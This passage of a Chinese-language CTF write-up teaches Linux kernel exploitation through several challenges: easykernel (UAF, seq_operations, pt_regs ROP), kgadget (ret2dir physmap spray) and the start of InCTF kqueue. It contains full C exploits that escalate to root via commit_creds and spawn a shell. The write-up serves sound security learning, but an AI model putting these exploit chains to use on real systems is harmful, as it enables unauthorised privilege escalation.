class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x300</span>/<span class="hljs-number">8</span>;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%lx\n&quot;</span>,*((<span class="hljs-type">size_t</span> *)data+i));<br>&#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%lx\n&quot;</span>,*((<span class="hljs-type">size_t</span> *)data+<span class="hljs-number">52</span>));<br>    <span class="hljs-type">size_t</span> kernel_base = *((<span class="hljs-type">size_t</span> *)data+<span class="hljs-number">52</span>)-(*((<span class="hljs-type">size_t</span> *)data+<span class="hljs-number">52</span>)&amp;<span class="hljs-number">0xffffff</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]kernel_base = 0x%lx\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-type">size_t</span> modprobe_path =  kernel_base+<span class="hljs-number">0xffffffff82448460</span><span class="hljs-number">-0xffffffff81000000</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]modprobe_path = 0x%lx\n&quot;</span>, modprobe_path);<br>    *((<span class="hljs-type">size_t</span> *)node1.buf+<span class="hljs-number">0x20</span>)=modprobe_path;<br>    <span class="hljs-built_in">edit</span>(&amp;node1);<br>    <span class="hljs-built_in">strcpy</span>(node1.buf, <span class="hljs-string">&quot;/tmp/chflag&quot;</span>);<br>    node1.len = <span class="hljs-number">0x10</span>;<br>    <span class="hljs-built_in">edit</span>(&amp;node1);<br><br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/tmp/aaa&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="从西湖论剑2021easykernel学习pt-regs结构体的利用"><a href="#从西湖论剑2021easykernel学习pt-regs结构体的利用" class="headerlink" title="从西湖论剑2021easykernel学习pt_regs结构体的利用"></a>从西湖论剑2021easykernel学习pt_regs结构体的利用</h2><p>linux系统调用的时候会把所有寄存器依次压入内核栈中形成pt_regs结构体。这一步是在调用syscall时的<code>entry_SYSCALL_64</code>函数来完成的。如图所示。之后各个寄存器按顺序压栈。想传什么数据（ROP）可以在用户态写汇编，这样就保存在了内核栈中。之后劫持内核流为add rsp， val；即可将内核流劫持到pt_regs结构体上，pt_regs上布置了我们要执行的ROP，因此可以getshell。<br><img src="https://i.imgur.com/WMEmrxm.png"></p><p>首先来分析一下题目。是一个菜单题，有读写申请释放功能，释放时没有将指针置空，因此存在UAF漏洞（注意读写和申请释放传入的不是同一种结构体，比较坑）。最大可以申请0x20大小的对象，seq_operations结构体也是0x20大小。因此可以申请后释放，再打开stat文件，stat文件申请的就是刚刚释放的对象，此时修改刚刚释放的对象，将start函数改为add rsp， val；即可。</p><blockquote><p>当我们打开一个 stat 文件时（如 &#x2F;proc&#x2F;self&#x2F;stat ）便会在内核空间中分配一个 seq_operations 结构体，该结构体定义于 &#x2F;include&#x2F;linux&#x2F;seq_file.h 当中，只定义了四个函数指针，如下：</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">seq_operations</span> &#123;<br>    <span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-built_in">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>    <span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-built_in">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们构造如下的ROP，至于为什么是swqpgs_restore_regs+8下面会提到。<br><img src="https://i.imgur.com/jvokOmj.png"></p><p>首先我们一直跟syscall直到push r15处，我们可以看到r15处的rsp值为0xffffc90000217f58，然后我们跟到调用seq_operations的start函数处，看一下此时的rsp值为0xffffc90000217db8，相差0x1A0，因此我们尽量找add rsp， 0x1a0； ret的gadget，但是没有找到，因此找add rsp， 0x170的gadget，因为下面还有6个pop，因此可以实现add rsp， 0x1a0的效果。<br><img src="https://i.imgur.com/6y6OMg4.png"></p><p><img src="https://i.imgur.com/DPJcG3N.png"></p><p><img src="https://i.imgur.com/PaOwCEN.png"></p><p>此时已经将内核流劫持到我们的r15寄存器的位置，也就是ROP的地方。当我们执行到swapgs_restore_regs的位置时，我们看到栈顶存放的是我们一开始传入rbp的值，这也就是为什么是swqpgs_restore_regs+8的原因。<br><img src="https://i.imgur.com/xtgV0aK.png"></p><p>之后就可以getshell了。</p><p>exp</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_OPS 0xffffffff81319d30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82663300</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81089250</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810c8d40</span><br><br><br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> seq_fd;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">op_chunk</span> &#123;<br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">alloc_chunk</span> &#123;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">readChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span> </span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">op_chunk</span> op = &#123;.idx = idx, .size = size, .buf = buf&#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x40</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">writeChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span> </span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">op_chunk</span> op = &#123;.idx = idx, .size = size, .buf = buf&#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x50</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span> </span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">op_chunk</span> op = &#123;.idx = idx&#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x30</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">allocChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span> </span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">alloc_chunk</span> alloc = &#123;.size = size, .buf = buf&#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x20</span>, &amp;alloc);<br>&#125;<br><span class="hljs-type">size_t</span> buffer[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode;<br><span class="hljs-type">size_t</span> init_cred;<br><span class="hljs-type">size_t</span> pop_rdi_ret;<br><span class="hljs-type">size_t</span> commit_creds;<br><span class="hljs-type">size_t</span> gadget;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    dev_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">allocChunk</span>(<span class="hljs-number">0x20</span>, buffer);<br>    <span class="hljs-built_in">deleteChunk</span>(<span class="hljs-number">0</span>);<br>    seq_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">readChunk</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buffer);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] start: %p\n&quot;</span>, (<span class="hljs-type">size_t</span>) buffer[<span class="hljs-number">0</span>]);<br>    kernel_offset = buffer[<span class="hljs-number">0</span>] - SEQ_OPS;<br>    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset;<br>    init_cred = INIT_CRED + kernel_offset;<br>    pop_rdi_ret = POP_RDI_RET + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    gadget = <span class="hljs-number">0xffffffff8172c151</span> + kernel_offset;<br>    buffer[<span class="hljs-number">0</span>] = gadget;<br>    <span class="hljs-built_in">writeChunk</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buffer);<span class="hljs-comment">//修改seq_ops-&gt;start函数</span><br>    swapgs_restore_regs_and_return_to_usermode += <span class="hljs-number">8</span>;<br>    __asm__(<br>    <span class="hljs-string">&quot;mov r15, pop_rdi_ret;&quot;</span><br>    <span class="hljs-string">&quot;mov r14, init_cred;&quot;</span><br>    <span class="hljs-string">&quot;mov r13, commit_creds;&quot;</span><br>    <span class="hljs-string">&quot;mov r12, swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp, 0x9999999999999999;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx, 0x8888888888888888;&quot;</span><br>    <span class="hljs-string">&quot;mov r11, 0x7777777777777777;&quot;</span><br>    <span class="hljs-string">&quot;mov r10, 0x6666666666666666;&quot;</span><br>    <span class="hljs-string">&quot;mov r9, 0x5555555555555555;&quot;</span><br>    <span class="hljs-string">&quot;mov r8, 0x4444444444444444;&quot;</span><br>    <span class="hljs-string">&quot;xor rax, rax;&quot;</span><br>    <span class="hljs-string">&quot;mov rcx, 3333333333333333;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx, 8;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi, rsp;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi, seq_fd;&quot;</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="从kgadget学习ret2dir与pt-regs"><a href="#从kgadget学习ret2dir与pt-regs" class="headerlink" title="从kgadget学习ret2dir与pt_regs"></a>从kgadget学习ret2dir与pt_regs</h2><p>ret2dir也就是return to direct mapped memory,具体原理可以直接参考<a href="https://www.jianshu.com/p/3c662b6163a7">bsauce师傅</a>和<a href="https://www.anquanke.com/post/id/185408">rtfingc师傅</a>的文章。文章中有小demo，大家可以调一下。<br>笔者能力有限，如有错误，还请大佬指点。大概解释一下，通过利用一个核心区域，直接映射系统的一部分或全部物理内存（用户空间内存映射到physmap，内核可直接访问physmap），允许攻击者在内核地址空间内访问用户数据。也就是说，用户空间分配的内存，会停留在RAM中，physmap和RAM是直接的映射关系，因此在用户空间填充的数据会映射到physmap中，而内核中有一片区域，叫direct mapping of all physical memory（0xffff888000000000 - 0xffffc87fffffffff），它将physmap映射到内核的一块空间中，此时就会将刚刚用户填充的数据从physmap映射到内核中，可以绕过smep和smap。</p><p>直接来看题，在ioctl函数中有call rbx，而rbx又是rdx地址存放的指针，因此存在一个指针解引用，按理说我们可以直接像上一题那样把ROP布置在pt_regs中，但是题目中对[rax-A8h]到[rax-70h]进行了销毁，pt_regs的大小为0xa8，因此销毁的是r15，r14,r13,r12,rbp,rbx以及r10，因此剩下的就剩r8和r9两个寄存器可以使用，我们可以用这两个寄存器进行栈迁移。首先用户态堆喷，以页为单位申请内存并构造ROP。此时这些已经够造好ROP的内存页也会被映射到内核中的direct mapping of all physical memory中。首先我们要先执行r8和r9寄存器中的栈迁移指令，因此需要计算call rbx时rsp与r9的距离。<br><img src="https://i.imgur.com/d2fnx7k.png"></p><p>可以看到，两者rsp相差0xc0，因此选择<code>add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret</code>的gadget,0xa0+4个pop。然后pop rsp之后进行栈迁移，从try_hit处一直用slide滑到ROP处，从而进行提权。为什么try_hit用0xffff888000000000+0x7000000，笔者猜0x7000000应该是一个神奇的数字。这道题exp中跳转到pt_regs的gadget和slide滑块用到的gadget是一样的，这里可能比较不好理解一点，具体可以调一下，自己调过之后会清晰很多（一定要自己调一下）。<br><img src="https://i.imgur.com/DaBNvUu.png"></p><p>EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prepare_kernel_cred 0xffffffff810c9540</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> commit_creds 0xffffffff810c92e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> init_cred 0xffffffff82a6b700</span><br><span class="hljs-type">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff8108c6f0</span>;<br><span class="hljs-type">size_t</span>  pop_rax_ret = <span class="hljs-number">0xffffffff810115d4</span>;<br><span class="hljs-type">size_t</span>  pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span> + <span class="hljs-number">27</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xe8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff812bd353</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xd8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff810e7a54</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="hljs-number">0xffffffff810737fe</span>;<br><span class="hljs-type">size_t</span>  ret = <span class="hljs-number">0xffffffff8108c6f1</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">size_t</span> page_size;<br><span class="hljs-type">size_t</span> *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-type">size_t</span> try_hit;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">constructROPChain</span><span class="hljs-params">(<span class="hljs-type">size_t</span> *rop)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span>     idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// gadget to trigger pt_regs and for slide</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x30</span>); idx++)<br>        rop[idx] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;<br><br>    <span class="hljs-comment">// more normal slide code</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x10</span>); idx++)<br>        rop[idx] = ret;<br><br>    <span class="hljs-comment">// rop chain</span><br>    rop[idx++] = pop_rdi_ret;<br>    rop[idx++] = init_cred;<br>    rop[idx++] = commit_creds;<br>    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) getRootShell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">saveStatus</span>();<br>    dev_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;dev fd!&quot;</span>);<br><br>    page_size = <span class="hljs-built_in">sysconf</span>(_SC_PAGESIZE);<br>    <span class="hljs-comment">// physmap_spray_arr[0] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16000</span>; i++)&#123;<br>        physmap_spray_arr[i] = <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!physmap_spray_arr[i])<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;oom for physmap spray!&quot;</span>);<br>        <span class="hljs-built_in">constructROPChain</span>(physmap_spray_arr[i]);       <br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger physmap one_gadget...&quot;</span>);<br><br>    try_hit = <span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>        <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    pop_rsp_ret;&quot;</span>   <span class="hljs-comment">// stack migration again</span><br>        <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   dev_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="从InCTF的kqueue学习内核堆溢出"><a href="#从InCTF的kqueue学习内核堆溢出" class="headerlink" title="从InCTF的kqueue学习内核堆溢出"></a>从InCTF的kqueue学习内核堆溢出</h2><p>这道题断断续续看了一周，得出一个结论，一定要上手调，硬看是看不出来什么的，结合别人写的EXP去整理思路。<br>题目的登陆账号是ctf，密码是kqueue。题目中的所有检查失败都执行了err函数，但是这个函数返回-1并不会造成程序退出，因此可以约等于没有检查（对做题有用）。<br>这道题解包文件系统再压缩后qemu就启动不起来了，不太清楚原因，所以用发送exp的脚本直接将exp发过去，不再解包压缩。<br>题目给了源码，堆溢出的漏洞发生在<code>save_kqueue_entries</code>函数处<br><img src="https://i.imgur.com/PkAX5yW.png"></p><p>至于为什么会溢出，原因在于data_size是我们给的request.data_size是我们给的，而new_queue的定义为<code>char *new_queue = validate((char *)kzalloc(queue-&gt;queue_size,GFP_KERNEL));</code>（定义同样也在save函数里）。我们可以看到申请的大小是queue-&gt;queue_size，因此只要我们确保我们传入的data_size大小大于queue_size即可。</p><p>这道题用到的的seq_operations结构体（之前的题中已经用过了），seq_operations的大小为0x20，所以我们要确保new_queue的大小也为0x20，这样它们就会被分配在相邻的空间里。这样溢出就可以修改start函数指针为我们的shellcode。</p><p>那么如何确保queue_size为0x20大小呢，因为struct 